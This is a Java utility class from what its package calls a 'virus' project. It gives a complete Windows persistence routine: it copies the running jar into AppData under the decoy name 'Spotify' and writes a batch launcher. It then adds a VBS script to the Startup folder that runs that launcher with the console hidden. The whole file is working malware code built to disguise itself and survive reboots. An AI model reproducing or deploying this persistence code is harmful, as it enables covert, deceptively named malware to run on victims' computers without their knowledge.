package me.bannock.virus.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class StartOnWindowsStartUtils {

    private static final String VIRUS_FALSE_NAME = "Spotify"; // Spotify because it's commonly bundled with windows
    private static final String VIRUS_LAUNCHER_VBS_NAME = VIRUS_FALSE_NAME + ".vbs";
    private static final String VIRUS_LAUNCHER_BAT_NAME = VIRUS_FALSE_NAME + ".bat";
    private static final String VIRUS_NAME = VIRUS_FALSE_NAME + ".jar";

    public static final File WINDOWS_APPDATA_ROAMING = new File(
            System.getProperty("user.home") + "/AppData/Roaming/"
    );

    public static final File VIRUS_INSTALL_DIR = new File(WINDOWS_APPDATA_ROAMING,
            VIRUS_FALSE_NAME + "/"
    );

    public static final File WINDOWS_START_LOCATION = new File(WINDOWS_APPDATA_ROAMING,
            "Microsoft/Windows/Start Menu/Programs/Startup/"
    );

    private static final File launcherVbs = new File(WINDOWS_START_LOCATION, VIRUS_LAUNCHER_VBS_NAME);
    private static final File launcherBat = new File(VIRUS_INSTALL_DIR, VIRUS_LAUNCHER_BAT_NAME);
    private static final File installedVirusJar = new File(VIRUS_INSTALL_DIR, VIRUS_NAME);

    /**
     * Sets up everything needed to make the jar start running on system start
     * @param programArgs The args to run the program with
     */
    public static void setupJarRunningOnSystemStart(String programArgs){
        if (!System.getProperty("os.name").toLowerCase().contains("windows"))
            throw new RuntimeException("System must be a windows machine for this feature to function");

        // Create necessary dirs
        VIRUS_INSTALL_DIR.mkdirs();

        // Get currently running virus jar
        File currentVirusJar = null;
        try {
            currentVirusJar = getCurrentJarRunLocation();
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }

        // First copy the running jar to the install dir, if we're running without a jar then package and then copy
        if (currentVirusJar.isDirectory()){
            System.out.println("Jar doesn't exist");
            // TODO: Package classes in the dir into the new jar
        }else{
            try {
                FileInputStream fileInputStream = new FileInputStream(currentVirusJar);
                if (installedVirusJar.exists())
                    installedVirusJar.delete();
                Files.copy(fileInputStream, installedVirusJar.toPath());
                fileInputStream.close();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }

        // Create batch script to run virus with
        if (launcherBat.exists())
            launcherBat.delete();
        try {
            Files.write(launcherBat.toPath(),
                    ("javaw -jar \"" + installedVirusJar.getAbsolutePath() + "\" " + programArgs).getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        // Create vbs script to run batch one with, this vbs script hides the console generated from the batch script
        if (launcherVbs.exists())
            launcherVbs.delete();
        try {
            String vbsScript = "Set oShell = CreateObject (\"Wscript.Shell\") \n" +
                    "Dim strArgs\n" +
                    "strArgs = \"cmd /c \"\"" + launcherBat.getAbsolutePath() + "\"\"\"\n" +
                    "oShell.Run strArgs, 0, false";
            Files.write(launcherVbs.toPath(),
                    vbsScript.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }

    /**
     * Gets location of the virus jar file
     * @return A file object that points to our jar, or the folder that our classes are stored in
     * @throws UnsupportedEncodingException If UTF-8 is not avaiable on the system
     */
    private static File getCurrentJarRunLocation() throws UnsupportedEncodingException {
        return new File(URLDecoder.decode(
                StartOnWindowsStartUtils.class.getProtectionDomain().getCodeSource().getLocation().getPath(),
                "UTF-8"));
    }

}
